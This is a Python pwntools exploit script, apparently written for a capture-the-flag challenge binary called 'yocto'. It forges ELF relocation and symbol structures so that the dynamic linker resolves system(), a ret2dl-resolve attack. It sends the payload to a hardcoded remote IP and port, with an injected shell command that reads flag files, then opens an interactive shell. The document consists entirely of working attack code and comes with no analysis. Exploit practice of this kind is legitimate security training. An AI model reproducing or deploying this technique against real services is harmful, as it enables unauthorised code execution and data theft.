from pwn import *

#p = process('yocto')
#p = remote('127.0.0.1',11008)
p = remote('140.113.209.24',11008)

raw_input('waiting...')

def align(addr, origin, size):
    padlen = size - ((addr-origin) % size)
    return (addr+padlen, padlen)

def fill(size, buf=''):
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    buflen = size - len(buf)
    assert buflen >= 0, "%d bytes over" % (-buflen,)
    return ''.join(random.choice(chars) for i in xrange(buflen))

e = ELF('./yocto')
jmprel = int(e.dynamic_by_tag('DT_JMPREL').entry.d_ptr)
relent = int(e.dynamic_by_tag('DT_RELENT').entry.d_ptr)
symtab = int(e.dynamic_by_tag('DT_SYMTAB').entry.d_ptr)
syment = int(e.dynamic_by_tag('DT_SYMENT').entry.d_ptr)
strtab = int(e.dynamic_by_tag('DT_STRTAB').entry.d_ptr)
PLTGOT = int(e.dynamic_by_tag('DT_PLTGOT').entry.d_ptr)
PLT = int(e.get_section_by_name('.plt').header['sh_addr'])
DLRESOLV = PLT

glob = 0x80495c0
base = glob+16+14+1
addr_reloc, padlen_reloc = align(base, jmprel, relent)
addr_sym, padlen_sym = align(addr_reloc+relent, symtab, syment)
addr_symstr = addr_sym + syment

r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
st_name = addr_symstr - strtab
print len(fill(padlen_reloc))
buf = fill(padlen_reloc)
buf += struct.pack('<II', base, r_info)                      # Elf32_Rel
buf += fill(padlen_sym)
buf += struct.pack('<IIII', st_name, 0, 0, 0x12)             # Elf32_Sym
buf += "system\x00"

print DLRESOLV
print len(str(21312)+"."+str(addr_reloc-jmprel)+"."+str(DLRESOLV)+"")
print len(str("1")+"."+str(addr_reloc-jmprel)+"."+str(DLRESOLV)+"")
print (str(0x08048300)+"."+str(addr_reloc-jmprel)+"."+str(DLRESOLV)+""+buf)
p.send(str(1)+"."+str(addr_reloc-jmprel)+"."+str(DLRESOLV)+";cat ~ctf/*   ;"+buf)

p.interactive()
